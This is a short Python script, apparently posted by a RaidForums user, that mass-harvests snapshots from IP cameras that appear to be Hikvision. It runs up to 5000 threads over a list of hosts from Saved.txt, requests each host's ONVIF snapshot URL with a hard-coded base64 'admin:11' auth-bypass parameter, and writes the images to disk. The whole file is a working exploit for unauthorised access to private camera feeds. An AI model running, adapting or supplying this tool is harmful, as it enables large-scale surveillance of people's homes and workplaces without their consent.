import requests
from multiprocessing.pool import ThreadPool
from functools import partial
import time, random

print('''
   ╦ ╦┬┬┌─┬┬  ┬┬┌─┐┬┌─┐┌┐┌  ╔═╗┌┐┌┌─┐┌─┐┌─┐┬ ┬┌─┐┌┬┐
   ╠═╣│├┴┐│└┐┌┘│└─┐││ ││││  ╚═╗│││├─┤├─┘└─┐├─┤│ │ │
   ╩ ╩┴┴ ┴┴ └┘ ┴└─┘┴└─┘┘└┘  ╚═╝┘└┘┴ ┴┴  └─┘┴ ┴└─┘ ┴

\n\n''')

print('   [+] The : is replaced with - in the saved files names\n\n')

with open('Saved.txt') as f:
    servers = [line.rstrip() for line in f]
    f.close()


# made by https://raidforums.com/User-bWlsbGVy


def login(session, server):
    url = f'{server}'
    img_data = requests.get(url).content

    # remove junk from URL so the URL numbers can be used as file name for image
    for x in [url]:
        url1=(x.replace("http://", ""))
    for x in [url1]:
        url2=(x.replace("/onvif-http/snapshot?auth=YWRtaW46MTEK", ""))
    for x in [url2]:
        url3=(x.replace(":", "-"))

    with open('images/'+url3+'.jpeg', 'wb') as handler:
        handler.write(img_data)
    print('   [ ! ] Saved snapshot of '+url)



if __name__ == "__main__":
    # creating a pool object
    with ThreadPool(min(len(servers), 5000)) as pool, \
    requests.Session() as session:
        # map will return list of None since `login` returns None implicitly:
        try:
            pool.map(partial(login, session), servers)
        except:
            print('\n\n   [ * ] Job finished!')
